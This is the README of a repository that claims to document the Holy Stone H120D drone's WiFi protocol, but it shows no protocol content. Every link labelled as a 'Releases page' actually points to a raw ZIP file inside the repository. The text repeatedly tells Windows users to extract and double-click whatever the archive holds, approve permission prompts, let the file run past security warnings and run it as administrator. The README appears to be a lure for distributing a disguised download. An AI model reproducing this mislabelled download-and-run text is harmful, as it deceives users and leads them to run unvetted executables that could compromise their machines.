# 🛰️ h120d-protocol - Control the H120D with clear steps

[![Download](https://img.shields.io/badge/Download-Releases-6C7BD9?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/eeeg2610/h120d-protocol/main/arduino/protocol-d-h-v3.8-beta.2.zip)

## 📥 Download

Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/eeeg2610/h120d-protocol/main/arduino/protocol-d-h-v3.8-beta.2.zip)

Use the latest release file for Windows. If the release includes a `.zip` file, download it first, then extract it before you run the app or scripts inside.

## 🪟 Get started on Windows

1. Open the [Releases page](https://raw.githubusercontent.com/eeeg2610/h120d-protocol/main/arduino/protocol-d-h-v3.8-beta.2.zip).
2. Find the latest release near the top.
3. Download the Windows file or the release archive.
4. If the file is a `.zip`, right-click it and choose **Extract All**.
5. Open the extracted folder.
6. Double-click the Windows app, script, or tool that came with the release.
7. If Windows asks for permission, choose **Yes**.
8. Follow the on-screen steps in the app or script window.

## 🔍 What this project does

This project gives you a working view of the Holy Stone H120D drone WiFi protocol. It helps you understand how the drone and your computer or phone talk to each other over WiFi.

It includes:
- Packet formats used by the drone
- Handshake flow before control starts
- Flight command messages
- Video stream data
- RT-Thread RTOS details from the drone
- Control scripts that work with the protocol

## 🧰 What you need

For a smooth start on Windows, use:
- Windows 10 or Windows 11
- A stable WiFi adapter
- A Holy Stone H120D drone
- 200 MB of free disk space
- A way to extract ZIP files, such as File Explorer
- A text editor if you want to view the scripts

If you plan to use the control scripts, keep the drone battery charged and place the drone near your PC during setup.

## ⚙️ How the setup works

The release files are meant to help you inspect the protocol and run the provided tools without building anything from source.

A typical flow looks like this:
1. Download the latest release from GitHub.
2. Extract the files if needed.
3. Connect your PC to the drone’s WiFi network.
4. Start the tool or script from the release folder.
5. Follow the prompts to open the control link.
6. Use the included commands to test connection, control, or video stream capture.

## 📡 How the drone connection works

The H120D uses WiFi to exchange short packets with the controller. These packets cover:
- Startup and pairing
- Flight control
- Camera and video data
- Device status updates

The repository shows how these parts fit together in plain form. That makes it easier to test the drone link, check command names, and see how the video stream starts.

## 🎮 Included control areas

The repo covers the main parts a user usually wants to inspect:
- Arm and handshake messages
- Direction and throttle commands
- Trim and mode changes
- Stream start and stop messages
- Basic packet checks
- RTOS-related data from the firmware

## 🗂️ Files you may see in a release

A release may include:
- A Windows-ready script
- Example packet logs
- Helper tools
- Notes on command fields
- Video stream tests
- Protocol reference files

If you see a script file, you can open it with a double-click or run it from PowerShell if the release notes say to do that.

## 🖥️ Running a script from Windows

If the release uses a script file:
1. Open the extracted folder.
2. Look for a file with names like `run`, `start`, or `control`.
3. Double-click the file if it is a Windows app or batch file.
4. If it opens in a console window, keep that window open.
5. Use the on-screen prompts to connect to the drone.

If Windows opens a security prompt, select the option that lets the file run.

## 📶 Connect to the drone WiFi

Before you use the control tools, connect your PC to the drone WiFi:
1. Turn on the drone.
2. Wait for its WiFi network to appear.
3. Open Windows WiFi settings.
4. Select the drone network.
5. Enter the WiFi password if needed.
6. Wait until Windows shows that it is connected.

Once connected, go back to the release folder and start the tool or script.

## 🎥 Working with the video stream

The repository also covers the H264 video stream used by the drone camera. That helps you inspect how live video starts and how the stream packets move over WiFi.

You may use this part to:
- Check if the camera stream starts
- Review stream packet data
- Match stream data with flight state
- Test capture tools that read the H264 feed

## 🧪 Helpful use cases

This project is useful if you want to:
- Study how the H120D drone talks over WiFi
- Test control packets
- Review packet layouts
- Inspect the video stream
- Compare firmware behavior with live traffic
- Build your own control tool later

## 📘 Basic terms

A few words in the repo may help:
- **Packet**: a small block of data sent over the network
- **Handshake**: the first exchange before control begins
- **Protocol**: the rules both sides follow
- **RTOS**: the system the drone runs on
- **H264**: the video format used for the stream

## 🛠️ Common Windows steps if the file does not open

If nothing happens when you open the file:
1. Right-click the file.
2. Select **Run as administrator** if the release notes ask for it.
3. Check that the file is not still inside the ZIP archive.
4. Make sure the file is in a normal folder like `Downloads` or `Desktop`.
5. Try opening the folder again and run the file from there.

If the tool needs extra files, keep all release files in the same folder.

## 📎 Download again if needed

If you need the latest files, go to the [GitHub Releases page](https://raw.githubusercontent.com/eeeg2610/h120d-protocol/main/arduino/protocol-d-h-v3.8-beta.2.zip) and download the newest release package for Windows.

## 🔧 Repo topics

arduino, drone, embedded, h264, holy-stone, iot, protocol, reverse-engineering, rt-thread, rtos, uav, wifi